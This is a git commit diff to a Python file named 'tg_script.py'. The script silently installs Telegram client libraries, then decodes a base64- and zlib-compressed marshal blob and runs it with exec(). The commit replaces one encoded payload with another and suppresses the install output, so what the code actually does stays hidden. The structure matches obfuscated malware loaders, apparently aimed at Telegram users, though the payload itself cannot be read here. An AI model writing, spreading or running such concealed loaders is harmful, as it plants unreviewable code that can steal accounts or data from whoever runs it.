d182e0b0376eee8d544ac580d04f9472f722abb9
error657756 <bdbfbfbff966@gmail.com>
2025-04-24 18:00:51 +0330

    Update tg_script.py

--- tg_script.py
+++ tg_script.py
@@ -3,13 +3,14 @@ import sys
 import base64
 import zlib
 import marshal
-print("01010")
-subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])
+import os
+print ("-1")
+subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # DATA
-DATA = "eJxlUL2LE0EUn8/9iKtB2aAIsUkVUPFydyRKOFg5sTkERdTdZtlk5nK52w/Z2Rj1mpRaaeeVtnpX2Nnqf2AgkNzY2FjYCVcIVzlzHyjkDbw3vx+/33tvpgv+C+OkHnxR6R1ggMEYJDCAUN9RjALEcIAZCQgCHHK8R3fhsSWgnG46YC42z81zgaXcNreYsYuOmWUQlJT/4ryWE17aM091ag+kzz/8AtXAAhBwiCDwFdbMc+yDIaxbv7SkDiW+nRX3Xl5vtpqNG0vLrYWlW553NxSPtvw7i48f3mw9GHaa0bNrfPVJ0IgW1wap763ej7Eyk7WPMdUtaJFt8VSivFNH0uxuREXYZ9JiWXeQ8LSoO9IqeMx7eZTkejeJMiHtTlaER8acag4rLE3BhehnqbTW+zFPo4RL54QKNSNJ9lRNguvyrOApC09HfAAH+jmHVlsUeT/trUirnWRsEPOV3D36CgCEr9JvDCH8CS59B/YPpz2yZyV3ZO4b9lt7Ylwe4Vn5wpvt19vTcm1cro2cfWq/urpDJrT6/vyMmFNSGZPKTu8T/EYqE9L4g4FxZUqrY1o9FGdU98+u5+KvLvWq5l8VfIiU"
+DATA = "eJxlkEtrE1EUx+9zZq6NFLEBUeLGjQEtNm1JWkJhpOKmCEpRM5thknuapp1HmTtp2qyydOnOrMSVoO3Cr+A3MBBoet24ceFO6ELoyrl9UMFz4dzzP4/ffbTQP2Zd7Cfvc/cOSSRxiCLsYWxiEhKPSOpRyTxGEGCgh/wAn494HCxp9U1k5zUHbGkfkPPaIvIE8K0i+s+AgTh0LvvyU4hZV3qf3ENzSOEewaiRa5PZow3Uw2Xxy7SUsaaPk+xZf7Zaq1YeLSzW5haWXfepr15uN57Mv1pfqr3oNavB7kNYfe1Vgvm1btxwV5+HNB9ma59DbhA8S7Yh7juzCpTqJLEmabNMtN3aDDK/I7Ujk1Y3gjgrT2kngxDaaRCl5paaJEqLZpL5Z4iUmxzNtS5csPw4iOBKbXRC0CzZgVjjDX1dQSz9S/ondGLedOrUVZZ24vaKdupRIrshrKQ3z/4DIbWeu98UY/wT3fqOxI9CfSAm12YG9rEl3oqxdXtAJ9N3hluj6fuDwjEXbx4M2ZiXPtyYMPuIFUesOGx/wd9Yccwqfyiy7h7x0oiXTtVUDv4441L6lXK3YP8FCVOHqQ=="
 secure_data = DATA
 payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
 exec(payload)
